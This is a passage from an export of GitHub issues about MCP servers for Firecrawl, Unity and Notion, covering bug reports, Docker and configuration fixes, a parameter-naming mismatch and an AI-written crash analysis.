3. Observe the error output regarding the missing `fireCrawlApiKey`.

**Expected Behavior**
The installation should proceed without an error if the API key is correctly supplied via Smithery.

**Actual Behavior**
The installation fails with a missing `fireCrawlApiKey` error, despite providing the key through Smithery.

**Additional Context**
- Unsure if the API key needs to be set elsewhere or if there is a mismatch between what Smithery provides and what the MCP server expects.
- No prior successful installs with this workflow.
- Using Windsurf Pro in Windows 11.

Please advise on where or how the `fireCrawlApiKey` should be configured to resolve this error.

## 2. Self-hosted firecrawl-mcp-server with SSE_LOCAL enabled

Then, I also self-hosted the `firecrawl-mcp-server` using Docker Compose, and set `SSE_LOCAL: true`.

## 3. Integration with n8n

In n8n, I managed to establish communication with the `firecrawl-mcp-server`, as evidenced by its ability to fetch the tool list.

![Tool list fetched successfully](https://github.com/user-attachments/assets/a924fd98-0a0f-46ab-856f-dcdd791ffa0f)

❌ However, when running the MCP client test in n8n, I receive a `404 Not Found` error.

There are no logs generated from either:

- `firecrawl` (the scraping backend)
- `firecrawl-mcp-server` (the MCP adapter)

Since a 404 is returned, I suspect the request actually reaches the `firecrawl-mcp-server`. Is it possible that detailed logging is not enabled by default in `firecrawl-mcp-server`?

Without proper logs, debugging this issue becomes very difficult.

## Summary of Questions

1. Why does the MCP client test return a 404 error?
2. Why are there no logs being generated on either service?
3. Is there a way to enable more verbose logging in `firecrawl-mcp-server` for debugging purposes?

Any help or suggestions would be greatly appreciated!"

I'm using the Firecrawl MCP server to create some documentation that I later feed into Cursor. While doing so, I instructed Cursor to use the crawl function, and it seems that once the crawl is completed and the results are returned from the server the content gets trimmed and limited to 100 characters.

The fix is very simple, but I'm wondering—is this a bug or a feature? :)

firecrawl/firecrawl-mcp-server,3010688559,48,Firecrawl MCP Tools Failures: `extract` Instability and Unimplemented `deep_research`/`generate_llmstxt`,open,2025-04-22T10:42:30Z,2025-04-22T10:42:30Z,[],Symplify62,"
During systematic testing of Firecrawl tools exposed via an MCP (Multi-Capability Platform) server integration, several tools consistently failed across multiple attempts. This issue details the problems encountered with `mcp_local_firecrawl_firecrawl_extract`, `mcp_local_firecrawl_firecrawl_deep_research`, and `mcp_local_firecrawl_firecrawl_generate_llmstxt`.

**Affected Tools:**

1.  `mcp_local_firecrawl_firecrawl_extract`
2.  `mcp_local_firecrawl_firecrawl_deep_research`
3.  `mcp_local_firecrawl_firecrawl_generate_llmstxt`

**Observed Behavior & Errors:**

1.  **`mcp_local_firecrawl_firecrawl_extract`:**
    *   Initial tests and retries failed.
    *   Error messages received included:
        *   `Error: no result from tool. The user likely interrupted the tool call to send you a message.`
        *   `Request failed with status code 500` (Internal Server Error) when attempting to extract from `https://docs.firecrawl.dev/introduction`)
    *   **Analysis:** While the core Firecrawl documentation confirms the `extract` feature ([https://docs.firecrawl.dev/introduction](https://docs.firecrawl.dev/introduction)), its implementation or configuration within the tested MCP server environment appears unstable or faulty, leading to inconsistent errors and failures.

2.  **`mcp_local_firecrawl_firecrawl_deep_research`:**
    *   Initial tests and retries failed.
    *   Error messages received included:
        *   `Error: no result from tool. The user likely interrupted the tool call to send you a message.`
        *   `Error calling tool: Tool mcp not found.`
    *   **Analysis:** Documentation review for `firecrawl-mcp-server` (across various commits/branches) did not show evidence of a `deep_research` tool implementation. It's suspected that this tool, despite being listed as available by the MCP environment, is **not actually implemented** in the version of `firecrawl-mcp-server` being run, causing the ""Tool not found"" errors.

3.  **`mcp_local_firecrawl_firecrawl_generate_llmstxt`:**
    *   Initial tests and retries failed.
    *   Error messages received consistently included:
        *   `Error calling tool: Tool mcp not found.`
    *   **Analysis:** Similar to `deep_research`, documentation review for `firecrawl-mcp-server` did not show evidence of a `generate_llmstxt` tool. It's suspected that this tool, despite being listed as available by the MCP environment, is **not actually implemented** in the version of `firecrawl-mcp-server` being run.

**Test Calls Attempted (Examples):**

```python
# Extract Attempt (Failed with 500 Error)
# print(default_api.mcp_local_firecrawl_firecrawl_extract(prompt=""Extract the main features..."", urls=[""https://docs.firecrawl.dev/introduction""]))

# Deep Research Attempt (Failed with Tool Not Found / User Interrupted)
# print(default_api.mcp_local_firecrawl_firecrawl_deep_research(query=""future of renewable energy"", maxUrls=5, timeLimit=60))

# Generate LLMs.txt Attempt (Failed with Tool Not Found)
# print(default_api.mcp_local_firecrawl_firecrawl_generate_llmstxt(url=""https://google.com""))
```

**Environment Details (Client):**

*   **Editor:** Cursor
*   **Version:** 0.48.9
*   **Commit:** 1.96.2 (61e99179e4080fecf9d8b92c6e2e3e00fbfb53f0)
*   **Date:** 2025-04-12T18:33:49.349Z
*   **Electron:** 34.3.4
*   **ElectronBuildId:** undefined (Note: Your provided info lists ElectronBuildId as undefined)
*   **Chromium:** 132.0.6834.210
*   **Node.js:** 20.18.3
*   **V8:** 13.2.152.41-electron.0
*   **OS:** Darwin x64 24.4.0 (Inferred from user info, OS version in your provided string seems different)

**Expected Behavior:**

*   `mcp_local_firecrawl_firecrawl_extract` should execute successfully and return the extracted data or a clear error if the extraction itself fails (not a server/tool error).
*   `mcp_local_firecrawl_firecrawl_deep_research` and `mcp_local_firecrawl_firecrawl_generate_llmstxt` should either:
    *   Execute successfully if they *are* intended to be implemented.
    *   Or, not be listed as available tools by the MCP server if they are not implemented, to avoid confusion.

**Suggestion:**

Could the maintainers please:
1.  Investigate the stability and configuration of the `extract` tool within the MCP server context?
2.  Verify whether `deep_research` and `generate_llmstxt` are intended features for `firecrawl-mcp-server`?
    *   If yes, ensure they are correctly implemented and callable.
    *   If no, update the MCP server's tool discovery mechanism to avoid listing unimplemented tools.

Thank you!"

firecrawl/firecrawl-mcp-server,2940086228,27,Dockerfile Build Errors,closed,2025-03-22T05:35:04Z,2025-04-23T05:34:09Z,[],Henry-Steele,"# Fix Docker build and execution errors in Firecrawl MCP Server

## Issue Description

The Firecrawl MCP Server Docker image build and execution is failing with two separate errors:

1. **Build Error**: During the build process, the `npm ci --omit=dev` command attempts to run the ""prepare"" script which depends on TypeScript (`tsc`), but TypeScript is not available because it's a dev dependency:
   ```
   > firecrawl-mcp@1.7.1 prepare
   > npm run build
   
   > firecrawl-mcp@1.7.1 build
   > tsc && node -e ""require('fs').chmodSync('dist/index.js', '755')""
   
   sh: 1: tsc: not found
   ```

2. **Runtime Error**: After fixing the build issue, the application fails to start with:
   ```
   Error: Cannot find module '/app/dist/src/index.js'
   ```
   This indicates a mismatch between the actual location of the compiled JavaScript files and the path specified in the ENTRYPOINT directive.

## Root Causes

1. The build process attempts to run scripts that depend on development dependencies, but those dependencies are being omitted with `--omit=dev`.
2. The ENTRYPOINT in the Dockerfile points to an incorrect path for the main JavaScript file.

## Solutions Implemented

### 1. Build Error Fix
Added the `--ignore-scripts` flag to the `npm ci` command to prevent running the ""prepare"" script:

```dockerfile
RUN npm ci --omit=dev --ignore-scripts
```

### 2. Runtime Path Fix
Updated the ENTRYPOINT to point to the correct path where the TypeScript compiler outputs the main JavaScript file:

```dockerfile
ENTRYPOINT [""node"", ""dist/index.js""]
```
Changed from:
```dockerfile
ENTRYPOINT [""node"", ""dist/src/index.js""]
```

## Additional Recommendations

1. **TypeScript Configuration**: Review your `tsconfig.json` to ensure the output directory configuration aligns with the paths used in the Dockerfile.

2. **Security Warning**: The Docker build process shows a warning about using environment variables for sensitive data:
   ```
   SecretsUsedInArgOrEnv: Do not use ARG or ENV instructions for sensitive data (ENV ""FIRECRAWL_API_KEY"")
   ```
   Consider using Docker secrets or environment variables passed at runtime instead of hardcoding them in the Dockerfile.

3. **Build Process Optimization**: Instead of running `npm ci` in both the builder and release stages, consider copying the `node_modules` directory from the builder stage to avoid reinstalling dependencies.

## Fixed Dockerfile

```dockerfile
# Generated by https://smithery.ai. See: https://smithery.ai/docs/config#dockerfile
# Use a Node.js image as the base for building the application
FROM node:18-alpine AS builder

# Set the working directory inside the container
WORKDIR /app

# Copy package.json and package-lock.json to install dependencies
COPY package.json package-lock.json ./

# Install dependencies (ignoring scripts to prevent running the prepare script)
RUN npm install --ignore-scripts

# Copy the rest of the application source code
COPY . .

# Build the application using TypeScript
RUN npm run build

# Use a smaller Node.js image for the final image
FROM node:18-slim AS release

# Set the working directory inside the container
WORKDIR /app

# Copy the built application from the builder stage
COPY --from=builder /app/dist /app/dist
COPY --from=builder /app/package.json /app/package.json
COPY --from=builder /app/package-lock.json /app/package-lock.json

# Install only production dependencies
RUN npm ci --omit=dev --ignore-scripts

# Set environment variables for API key and custom API URL if needed
ENV FIRECRAWL_API_KEY=your-api-key
ENV FIRECRAWL_API_URL=https://firecrawl.your-domain.com

# Specify the command to run the application
ENTRYPOINT [""node"", ""dist/index.js""]
```

## Steps to Verify

1. Build the Docker image with the corrected Dockerfile:
   ```
   docker build -t mendableai/firecrawl:latest -f Dockerfile .
   ```

2. Run the Docker container:
   ```
   docker run -i --rm mendableai/firecrawl
   ```

The application should now build and start successfully."

firecrawl/firecrawl-mcp-server,2923144645,22,MCP Server Initialization and Tool Usage Issues,closed,2025-03-16T15:46:35Z,2025-03-19T20:55:37Z,[],Henry-Jessie,"# MCP Server Initialization and Tool Communication Issues

## Problem Description

I've encountered persistent issues with the firecrawl-mcp server when using a Python client to communicate via stdio:

1. During initialization, the server outputs `FireCrawl MCP Server running on stdio` but then hangs indefinitely
2. Similar hanging issues occur when attempting to call any tools after a successful initialization
3. The process never completes or returns any response, requiring manual termination
4. I'm using the latest Python MCP library (mcp==1.4.1) and up-to-date firecrawl-mcp

This appears to be a continuation of the problem originally reported in [Issue #17](https://github.com/mendableai/firecrawl-mcp-server/issues/17), which remains unresolved.

## Temporary Workaround Discovered

After extensive debugging, I've identified that the hanging behavior appears to be related to the logging mechanism. I was able to successfully resolve both the initialization and tool usage problems by:

1. Locating the firecrawl-mcp installation directory (typically at `~/.npm/_npx/xxxxx/node_modules/firecrawl-mcp/dist` or similar path)
2. Editing `index.js` to comment out **all** `server.sendLoggingMessage` statements throughout the codebase

This workaround suggests the issue may be in how logging messages are being processed in stdio mode, possibly creating a deadlock or interfering with the normal request/response flow.

## Request for Maintainers

Could the maintainers please investigate this logging-related issue? It appears to be a significant blocker for Python clients attempting to use firecrawl-mcp via stdio. A proper fix would be greatly appreciated, as the current workaround requires manual code modification that would be lost with each update.

Thank you for your attention to this matter."

Description
Environment Information
Operating System: Windows
Local firecrawl version: v1.6.0
firecrawl-mcp version: 1.5.0
Cursor version: 0.47.5

Problem Description
I have successfully deployed firecrawl service locally using Docker Compose, and the API works normally when tested with curl. However, when I try to call firecrawl tools through Cursor's MCP service, I encounter a ""Cannot read properties of undefined (reading 'status')"" error.

Steps to Reproduce
1.Deploy firecrawl locally using Docker Compose
2.Configure MCP service in Cursor
```
{
  ""mcpServers"":{
    ""firecrawl-mcp"": {
      ""command"": ""C:\\Windows\\System32\\cmd.exe"",
      ""args"": [
        ""/c"",
        ""set FIRECRAWL_API_URL=http://localhost:3002 && npx -y firecrawl-mcp"" 
      ],
      ""enabled"": true
    }
  }
}
```
3.The MCP service successfully starts in the Cursor interface, showing the list of tools

![Image](https://github.com/user-attachments/assets/83bd3269-329f-4edc-ab2f-72af1711406d)

4.Try to use the firecrawl_scrape tool to scrape web content

![Image](https://github.com/user-attachments/assets/5e263b75-409a-4b40-b661-c3ec744f2b61)

```
{
  ""url"": ""https://example.com"",
  ""formats"": [
    ""markdown""
  ],
  ""onlyMainContent"": true
}
```
5.Receive error: ""Cannot read properties of undefined (reading 'status')""

Verification Test
Using curl to directly call the local API works perfectly:
```
curl -X POST http://localhost:3002/v1/scrape \
     -H 'Content-Type: application/json' \
     -d '{""url"":""https://example.com"",""formats"":[""markdown""],""onlyMainContent"": true}'
```
Returns the correct result:
`{""success"":true,""data"":{""markdown"":""Example Domain\n==============\n\nThis domain is for use in illustrative examples in documents. You may use this domain in literature without prior coordination or asking for permission.\n\n[More information...](https://www.iana.org/domains/example)"",""metadata"":{""viewport"":""width=device-width, initial-scale=1"",""title"":""Example Domain"",""scrapeId"":""1402b3f9-d808-44f9-9db0-97b368d34c06"",""sourceURL"":""https://example.com"",""url"":""https://example.com"",""statusCode"":200}}}`

Attempted Solutions
Updated the API path in the MCP configuration (tried both http://localhost:3002 and http://localhost:3002/v1)

Suspected Cause
The API response format expected by the MCP client (firecrawl-mcp 1.5.0) may not match what is provided by the local firecrawl API (v1.6.0), or there might be an issue with the environment variable setting method in the Windows environment.
Please provide guidance on how to resolve this compatibility issue, especially when using a locally deployed firecrawl service.

`manage_gameobject` currently:

**Retrieves:**

- GameObject Basic Info
  - Instance ID, name, tag, layer
  - Active state, static flags
  - Transform data (position, rotation, scale)
  - Parent/child hierarchy relationships
  - Prefab status and connections
- Component Data
  - All components on a GameObject (get_components)
  - Single component data (get_component)
  - Serialized component properties (public + [SerializeField] private fields)
  - Component instance IDs and type names
- Search/Find Results
  - Find by: ID, name, path, tag, layer, component type
  - Support for finding in children, inactive objects
  - Returns full GameObject data for found objects

**Updates:**

- GameObject CRUD
  - Create: Empty, primitives, or prefab instances
  - Modify: Name, parent, tag, layer, active state, transform
  - Delete: Single or multiple GameObjects
- Component Management
  - Add: Components with optional initial properties
  - Remove: Components by type name
  - Set Properties: Nested property support (e.g., material.color, materials[0].color)
- Special Features
  - Prefab creation and instantiation
  - Undo/Redo support throughout
  - Physics component conflict detection (2D vs 3D)
  - Tag/Layer auto-creation
  - GameObject/Component reference resolution


There are many problems with how it's structured, here are some of the important ones:

- LLMs trip themselves up with parameters, there's literally too much for this tool. 
  - These are pretty basic operations and it annoys me that it hast to make 2/3 calls to get things right
- We can't see what components are in the GameObject w/o serializing everything
- The `ManageGameObject.cs` is 2.5K lines long, and really hard to test and maintain
- There's a lot of redundant serializing in ManageGameObject's logic, and it happens twice because of how we list the scene hierarchy

So I have a solution for this:

- Tools
  - `manage_gameobject` - GameObject lifecycle (create, modify, delete)
  - `manage_components` - Component lifecycle (add, remove, set_property)
  - `manage_scene` - Scene lifecycle (create, load, save)
  - `find_gameobjects` - Search operations (returns IDs only)
- Resources
  - unity://scene/active - Active scene info
  - unity://scene/active/hierarchy - Scene hierarchy with component type lists
  - unity://scene/build-settings - Build settings scenes
  - unity://gameobject/{instanceID} - Single GameObject info (no components)
  - unity://gameobject/{instanceID}/components - All components with full data
  - unity://gameobject/{instanceID}/component/{name} - Single component data
    - There's a possibility a component can have the same name, so we may do index number 

Benefits:

- Less confusion for the LLMs using the tools
- Easier to manage development wise
- More data of how this plugin is actually used"

It would be very useful if Unity MCP exposed a command to explicitly trigger script compilation (e.g. /check_compilation) and return structured results (success, warnings, errors).

I tried making a custom [MenuItem] that forces a refresh, but detecting compilation success/failure was unreliable. I also tried filtering logs (with Claude’s help) but couldn’t isolate only the relevant compiler messages cleanly.

An official command would make automation and tooling workflows much more reliable.

[mcp crashes.txt](https://github.com/user-attachments/files/21946459/mcp.crashes.txt)

Here's what RooCode (AI) said:

Based on the crash logs and examining the MCPForUnityBridge.cs file, I can identify several potential causes for the Unity crashes you're experiencing:

**Root Cause Analysis**

The crash is occurring during Unity's assembly reload process, specifically when the MCP bridge is shutting down. Here are the key issues:

**1. Race Condition in Stop Method**

The Stop() method (lines 328-353) has a potential race condition:

```
private static void Stop()
{
    lock (startStopLock)  // Good, has locking
    {
        if (!isRunning) return;
        
        // This sets isRunning = false immediately
        isRunning = false;
        
        // But background tasks might still be running...
        WriteHeartbeat(false);  // File I/O during shutdown
        listener?.Stop();       // TCP cleanup
        listener = null;
        
        // This could be called while ProcessCommands is executing
        EditorApplication.update -= ProcessCommands;
        
        Debug.Log(""...stopped."");  // Line 346 where crash occurs
    }
}
```


**2. Background Task Management**

The code starts a background task with Task.Run(ListenerLoop) (line 314) but never properly cancels or awaits it during shutdown. This can cause:

- Lingering TCP connections
- Background threads continuing to execute during domain reload
- Memory access violations when the domain is being unloaded

**3. File I/O During Shutdown**

The WriteHeartbeat() calls during shutdown (lines 342, 693) perform file operations that can conflict with Unity's domain reload process.

**4. Event Handler Cleanup**

The EditorApplication.update -= ProcessCommands (line 345) can be problematic if ProcessCommands is currently executing when the delegate is removed.

**Specific Crash Pattern**

Your logs show this sequence:

1. StopAssetImportingV2 triggers asset pipeline refresh
2. MCP bridge receives OnBeforeAssemblyReload() callback
3. Stop() method executes and logs at line 346
4. Native crash occurs during the shutdown sequence

**Recommendations to Fix**

The script is likely contributing to crashes due to improper cleanup during assembly reloads. Here are the main fixes needed:

1. Add proper task cancellation - Use CancellationTokenSource to cancel background tasks
2. Ensure thread safety - The background ListenerLoop task needs proper cancellation handling
3. Remove file I/O during shutdown - Move heartbeat writes to a safer location
4. Add exception handling - Wrap cleanup operations in try-catch blocks
5. Use proper async/await patterns - Replace Task.Run with more controlled task management

The native crash indicates memory corruption or access violations, likely caused by the background task continuing to run while the Unity domain is being unloaded. This is a classic issue with Unity editor scripts that don't properly handle domain reload events."

So the log entry is a warning?, the MCP thinks the operation was successful but the game object reference was not set the script in the inspector.

If you need more examples let me know.

I'm using Rider with Claude code running in the terminal within Rider. 

It seems to connect and do some things but at times cannot connect and times out or is awfully slow and I wondered if this editor window where it says Claude is not configured has something to do with it.

Am I missing some steps? I would like to see the editor window say that Claude code is configured."

I want to be able to send prompts directly from unity and not use the cursor's chat box. I know that I can't directly send the natural language prompts to the MCP server because it needs to get a structured format to be able to process the tool calls, therefore there hast to be a LLM step inside the MCP server. Cursor for example solves this LLM step directly inside Cursor. So when Cursor receives the prompt, it converts it to a tool call and then sends it to MCP server. 

In order to call MCP tools from Unity, there has to be a LLM that interprets the prompt, and creates a structured format. How do I achieve this?

**Basically what I am asking is:** How to send prompts directly from Unity to MCP client like cursor, Claude Desktop etc."

I am using the MCP plugin tool for Unity to assist with my AI programming, and I’ve encountered several issues while working with it. My development environment is the Tuanjie 1.6 engine, which is based on Unity 2022 LTS. Here are the specific problems I’m facing:

1. Long compilation waits: After importing the MCP plugin, the project sometimes gets stuck in a prolonged compilation process.
2. Persistent port occupation errors: The plugin frequently prints errors indicating that a port is already in use. This issue occurs repeatedly.
3. Tool inactivity after other script errors: When other scripts in the project throw errors, the MCP plugin becomes ineffective. Since one of the purposes of my using this tool is to help diagnose and resolve such errors, this inactivity significantly affects its functionality.

I would greatly appreciate any guidance or fixes to address these issues. Thank you for your support!"

## **Problem Description**
The `execute_menu_item` MCP tool was consistently failing with the error message ""Required parameter 'menu_path' is missing or empty"" even when the `menu_path` parameter was correctly provided in the function call.

## **Root Cause Analysis**
The issue was caused by a **parameter naming convention mismatch** between the Python client and Unity C# handler:

- **Python side** (`execute_menu_item.py`): Sends parameters using **camelCase** naming convention
  ```python
  params_dict = {
      ""action"": action,
      ""menuPath"": menu_path,  # ← camelCase
      ""parameters"": parameters if parameters else {},
  }
  ```

- **Unity C# side** (`ExecuteMenuItem.cs`): Expected parameters using **snake_case** naming convention
  ```csharp
  string menuPath = @params[""menu_path""]?.ToString();  // ← snake_case
  ```

This mismatch caused the C# handler to always receive `null` when looking for `menu_path`, while the actual parameter was sent as `menuPath`.

## **Solution**
Modified the Unity C# handler to support both naming conventions:

**Before (line 57 in `ExecuteMenuItem.cs`):**
```csharp
string menuPath = @params[""menu_path""]?.ToString();
```

**After:**
```csharp
// Try both naming conventions: snake_case and camelCase
string menuPath = @params[""menu_path""]?.ToString() ?? @params[""menuPath""]?.ToString();
```

Also updated the error message to reflect both supported parameter names:
```csharp
if (string.IsNullOrWhiteSpace(menuPath))
{
    return Response.Error(""Required parameter 'menu_path' or 'menuPath' is missing or empty."");
}
```

## **Testing Results**
After the fix, all menu item executions work correctly:

✅ **Successful executions:**
- `Help/About Unity`
- `Assets/Refresh` 
- `File/Save Project`
- `Edit/Play`

✅ **Security features working:**
- Blacklisted items (e.g., `File/Quit`) are correctly blocked
- Error handling provides clear feedback

✅ **Safety features:**
- Uses `EditorApplication.delayCall` for thread-safe execution
- Comprehensive error logging
- Graceful handling of invalid menu paths

## **Files Modified**
- `Packages/unity-mcp-master/Editor/Tools/ExecuteMenuItem.cs` (lines 57 and 62)

## **Backward Compatibility**
The fix maintains full backward compatibility by supporting both naming conventions, ensuring existing code continues to work while fixing the immediate issue.

## **Code Diff**
```diff
- string menuPath = @params[""menu_path""]?.ToString();
+ // Try both naming conventions: snake_case and camelCase
+ string menuPath = @params[""menu_path""]?.ToString() ?? @params[""menuPath""]?.ToString();

- return Response.Error(""Required parameter 'menu_path' is missing or empty."");
+ return Response.Error(""Required parameter 'menu_path' or 'menuPath' is missing or empty."");
```

## **Recommendations for Future Development**
This issue highlights the importance of consistent parameter naming conventions between different language implementations in the Unity MCP bridge. Consider standardizing on one convention (preferably snake_case to match the MCP tool schema) across all tools for future development.

## **Environment**
- Unity Version: 2022.3.49f1
- Unity MCP Bridge: Latest version
- Platform: macOS 14.5.0
- Issue Status: ✅ **RESOLVED**

CursorAI considers 25 tool calls to be a request, so it behooves us to make batch tool calls if the AI can handle it. Ideally we could run sequences of operations as well as ""parallel"" operations (not actually multithreaded, but not waiting for a return).

Since there's a soft limit of 40 tools, I recommend we make UnityEditor_Manipulate a single tool and just like MCP protocol does, give the AI descriptions of how to use the different tools available inside this.

The document that lays out what tools it can use (and their descriptions, parameters, and how to use them, similar to MCP) can also contain any custom prompting needed to get it to use tools correctly and get past common hang-ups.

Basically this creates our own level of context protocol. I've had some level of success with this though I don't have time to work on it more."

I've started playing around and testing unity-mcp with Cursor today. I did some basic tests (""Create Sphere"") that have worked successfully, however, when I was trying to have Cursor access the logs I couldn't get it to work.

I created both a compilation error and threw an exception to test if it would work for runtime, but I couldn't get anything back. Did I miss something?

# Root Cause Analyze
After examining the code and error logs, I've identified a parameter naming mismatch between the Python server and C#  components of the Unity MCP Bridge system.

## Python Side
In `UnityMcpServer\src\tools\execute_menu_item.py`, the server constructs parameters using camelCase naming convention:

```Python
params_dict = {
            ""action"": action,
            ""menuPath"": menu_path,
            ""parameters"": parameters if parameters else {},
}
```

## C# Side

However, in `UnityMcpBridge/Editor/Tools/ExecuteMenuItem.cs`, the code expects snake_case parameter naming:
```C#
string menuPath = @params[""menu_path""]?.ToString();
// string alias = @params[""alias""]?.ToString(); // TODO: Implement alias mapping based on refactor plan requirements.
// JObject parameters = @params[""parameters""] as JObject; // TODO: Investigate parameter passing (often not directly supported by ExecuteMenuItem).

if (string.IsNullOrWhiteSpace(menuPath))
{
    return Response.Error(""Required parameter 'menu_path' is missing or empty."");
}
```
i.e., UnityMcpBridge is expecting `params[""menu_path""]`, but UnityMcpServer sends  ` ""menuPath"": menu_path,`. 


## Need Fix? 

Would you like me to help fix this issue? I'd be happy to prepare a pull request to address this parameter naming inconsistency."

In the previous versions, we could view the output/response directly from Claude Desktop by clicking into each MCP function called, but now however, clicking on these MCP functions does not result in anything and just scripts blindly running for some reasons I would not know, and the only way to check the output of each function would be the very messy log file from claude. 

![Image](https://github.com/user-attachments/assets/6c10c6de-6579-4b8a-8480-7ddb307f7a3a)

I am not sure if it is the new server-client architecture decluttering the output, or the new update from Claude (since there's no way to check if they updated the app). It would be great if there is a way for us to check each response information clearly from either the Claude side or the Unity side. Does this sound understandable? Hope I expressed myself clearly.

I am very happy to know about this project. I am also trying to contribute to this open source community and I would like to suggest an idea and get your opinion.

Currently, when looking at the process of getting the type passed as a parameter in tools like 'ModifyObject', it looks for it through all assemblies using reflection, but I think it doesn't do what we want perfectly due to the nature of Unity. For example, if you try to get the 'Button' class, both 'UnityEngine.UI' and 'UnityEngine.UIElements' are candidates.

There are other reasons, but for this reason, working on Unity UI is relatively difficult. So my suggestion is to provide namespace priorities using the editor and operate with those priorities to find them as much as possible. 

I'm currently implementing this idea, but if you have a better idea, please leave it here.

makenotion/notion-mcp-server,3572421908,143,Bug: notion-update-page escapes user mentions when updating content,open,2025-10-30T20:37:23Z,2025-10-30T20:37:23Z,[],mpiroc,"## Bug Description

The `notion-update-page` tool improperly escapes user mentions (`<mention-user>` tags) when updating page content. User mentions that exist in the original content are converted to escaped strings like `\\{\\{user://...\\}\\}` instead of preserving the proper `<mention-user url=""{{user://...}}""/>` format.

## Steps to Reproduce

1. Create or identify a Notion page with action items containing user mentions (e.g., `<mention-user url=""{{user://1f9d872b-594c-81cc-8948-0002e98318dd}}""/>`)
2. Use the `notion-fetch` tool to read the page - confirms mentions display correctly as `<mention-user>` tags
3. Use the `notion-update-page` tool with `replace_content_range` command to update a section containing user mentions
4. Fetch the page again with `notion-fetch` to observe the result

## Expected Behavior

User mentions should be preserved in their original format (`<mention-user url=""{{user://...}}""/>`) and display correctly as user mentions in the Notion UI.

## Actual Behavior

After updating, user mentions are escaped and appear as:
- `\\{\\{user://1f9d872b-594c-81cc-8948-0002e98318dd\\}\\}` in the fetched content
- Plain text in the Notion UI instead of clickable user mentions

## Investigation & Additional Context

- The issue occurs even when the new content string includes properly formatted `<mention-user>` tags
- Multiple consecutive updates compound the escaping (e.g., `{{{{https://...}}}}`)
- The `notion-fetch` tool correctly reads and displays `<mention-user>` tags from original content
- Only `notion-update-page` causes the escaping - suggests the issue is in how the update tool processes or serializes the content before sending to the Notion API
- This makes it impossible to programmatically update pages with action items or task lists that have user assignments without breaking the user mentions

## Example

Original content (from `notion-fetch`):
```
- [ ] <mention-user url=""{{user://1f9d872b-594c-81cc-8948-0002e98318dd}}""/> We need a story for table-body-skeleton
```

After using `notion-update-page` (from subsequent `notion-fetch`):
```
- [ ] \\{\\{user://1f9d872b-594c-81cc-8948-0002e98318dd\\}\\} We need a story for table-body-skeleton
```

The Notion MCP connection via OAuth (hosted at mcp.notion.com) randomly disconnects in Claude Desktop. When this happens, the integration settings only show the MCP server URL without any tools listed below it.

### Environment
- **MCP Version**: Hosted (OAuth via mcp.notion.com)
- **Client**: Claude Desktop
- **Claude Desktop Version**: [Insert your version - find it in About Claude]
- **OS**: macOS [or your OS]
- **Network**: Stable WiFi connection (no other connectivity issues)

### Expected Behavior
The Notion MCP connection should remain stable, with all tools consistently available in the integration settings.

### Actual Behavior
- Connection works sometimes, showing all tools (Search Notion, Fetch entities, Create pages, etc.)
- Connection drops randomly, showing only the server URL without tools
- No clear pattern - happens at different times/contexts
- Restarting Claude Desktop sometimes fixes the issue
- Issue recurs after variable time periods

### Steps to Reproduce
1. Connect Notion via OAuth in Claude Desktop settings
2. Use the integration normally (search, fetch, create operations)
3. Connection drops at unpredictable intervals
4. Integration settings show only `https://mcp.notion.com/mcp` without tool list

### Impact
Makes the integration unreliable for professional use cases requiring consistent workspace access.

### Workaround
Fully quit and restart Claude Desktop when the connection drops (not always!)

### Additional Context
- All Notion pages are properly shared with the integration
- No errors visible in Claude Desktop UI when connection drops
- Network connection remains stable throughout
- Issue persists across multiple days/sessions

### Question
Is this a known issue with the hosted MCP server? Should I consider switching to the self-hosted version for better stability?"

Will the Notion OSS MCP tools and their schemas be updated to reflect this change, or are users expected to fend for themselves? 
As far as I can tell, none of the tools exposed by the official remote MCP server currently reflect this change, this leads to issues when working with DBs with multiple data sources. Something else that's strange; the [available tools](https://developers.notion.com/docs/mcp-supported-tools#examples) listed in the docs don't even share their names with the ones I see available in my MCP clients (5ire, Cherry):

Example: the tool notion-fetch, as described in the docs and [Claude Desktop](https://imgur.com/i18nU9L), doesn't exist in the tools supplied by notion-mcp-server on NPM. This is the tool used by Claude to fetch pages and DBs (along with an array of `data-source-id` s which claude then uses to work with data stored in the DBs).

Overall they seem like completely different tools when I compare their schemas and what they do. When I checked the Notion tools available to Claude (when used with Claude Desktop) via Settings -> Connections -> Notion -> configure, I noticed that they are functionally identical to the tools I found in the docs.

Currently, the only way for me to agentically interact with my content in Notion is via Claude Desktop with its official (and, I assume, closed-source) Notion connector/integration. This is unsustainable, as using the Desktop App instead of the API to interact with Claude/Ghidra/Notion usually leads to me hitting the Pro plan session limit in less than 10 prompts"

Environment: Firebase Studio | Cloud VSCode | Gemini | Gemini CLI

The goal was to run the @notionhq/notion-mcp-server within a VS Code cloud environment. Like many of you, several standard configurations, as suggested both here officially and in the issues section, in mcp.json were attempted but failed:

Direct npx execution: This failed with authorization errors or a generic MCP error -32000: Connection closed.

Docker execution: This was initially explored, but abandoned since it wasn't ideal for my setup.

### 2. Verifying the Core Command

The first step was to confirm if the npx command itself was valid. We ran it directly in the VS Code terminal:

``` bash
NOTION_TOKEN=""ntn_..."" NOTION_API_VERSION=""2022-06-28"" npx -y @notionhq/notion-mcp-server
```
The command ran without any error output; it simply hung, waiting for input. This proved that the command, token, and API version were all correct and that the problem was specific to how the MCP extension was launching the process.

### 3. Investigating the Execution Environment

Since the manual command worked but the MCP configuration failed, I suspected the extension was not creating the same environment as the terminal. To investigate, I created a debug server to inspect the environment variables being passed by the extension:

``` json
""notionApi-debug"": {
	""command"": ""env"",
		""args"": [],
		""env"": {
			""NOTION_TOKEN"": ""ntn_..."",
			""NOTION_API_VERSION"": ""...""
		}
}
```
### 4. The Key Issue

This debug server immediately failed with a revealing error in the MCP Output channel:

> [warning] [MCPManager] Error from server notionApi-debug: SyntaxError - Unexpected token 'N', ""NOTION_TOK""... is not valid JSON

This was the key bit of info needed. It showed that the MCP extension expects the server process to communicate strictly via JSON-RPC. When the env command printed plain text, the extension tried to parse it as JSON, failed, and closed the connection. This meant that the original npx command was also likely failing instantly and printing a plain-text error message, but that real error was being hidden behind the generic ""Connection closed"" message.

### 5. The Solution: Forcing an Identical Environment

Knowing that the manual bash command worked, the final solution was to force the MCP extension to replicate that exact execution context. I **wrapped the entire working command in a bash -c ""..."" call.**

``` json
{
	""mcpServers"": {
		""notionApi"": {
			""command"": ""bash"",
			""args"": [
			""-c"",
			""NOTION_TOKEN='ntn_...' NOTION_API_VERSION='2022-06-28' npx -y @notionhq/notion-mcp-server""
			]
		}
	}
}
```
This approach bypasses any issues with how the VS Code extension handles environment variable injection or sets the PATH, ensuring the server is launched in the exact same way as the successful manual test.

